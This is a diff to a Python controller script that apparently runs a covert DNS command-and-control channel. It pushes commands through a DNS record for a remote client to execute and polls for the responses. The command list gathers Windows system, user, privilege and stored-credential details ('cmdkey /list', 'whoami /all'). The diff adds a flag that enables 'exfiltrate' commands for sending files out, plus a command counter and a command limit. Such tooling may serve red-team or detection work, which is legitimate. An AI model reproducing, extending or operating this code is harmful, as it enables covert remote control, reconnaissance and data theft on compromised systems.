@@ -5,6 +5,13 @@ import time
 import base64
 import random
 
+# if exfiltration commands will be automatically run
+DO_EXFILTRATION = False
+
+# number of commands to auto run before stopping
+# set to -1 to have no limit
+COMMAND_LIMIT = -1
+
 # sleep time between checking response record
 SLEEP_TIME = 1
 
@@ -35,20 +42,21 @@ SAMPLE_COMMANDS = [
         'wmic service list brief',
         'schtasks /query /fo LIST /v',
         'set',
-        'exfiltrate message.txt',
-        'exfiltrate data.zip',
         'echo %USERNAME%',
         'echo %USERDOMAIN%',
         'net config workstation',
         'wmic computersystem get model,name,manufacturer,systemtype',
         'wmic os get caption,version,osarchitecture',
         'whoami /all',
-        'netsh wlan show profiles',
         'wmic logicaldisk get name,description,filesystem,freespace,size',
         'cmdkey /list',
         'whoami /priv',
         'whoami /groups'
 ]
+
+if DO_EXFILTRATION:
+    SAMPLE_COMMANDS.append('exfiltrate message.txt')
+    SAMPLE_COMMANDS.append('exfiltrate data.zip')
 
 
 # update the covert record with the next command we want the client to run
@@ -103,11 +111,13 @@ def automatic_control():
     resolver = dns.resolver.Resolver()
     resolver.nameservers = [DNS_IP]
 
+    command_counter = 1
+
     while True:
         time.sleep(1)
         command_index = random.randint(0, len(SAMPLE_COMMANDS)-1)
         command = SAMPLE_COMMANDS[command_index]
-        print(f'Selected command "{command}"')
+        print(f'{command_counter}: Selected command "{command}"')
         response = update_record(COMMAND_RECORD, command)
 
         if "SERVFAIL" in str(response):
@@ -133,6 +143,11 @@ def automatic_control():
                 break
         else:  #  timeout received
             print('Response timed out from client\n')
+        
+        command_counter += 1
+        if COMMAND_LIMIT != -1 and command_counter > COMMAND_LIMIT:
+            print(f'Command limit of {COMMAND_LIMIT} reached. Quitting...')
+            break
 
 
 
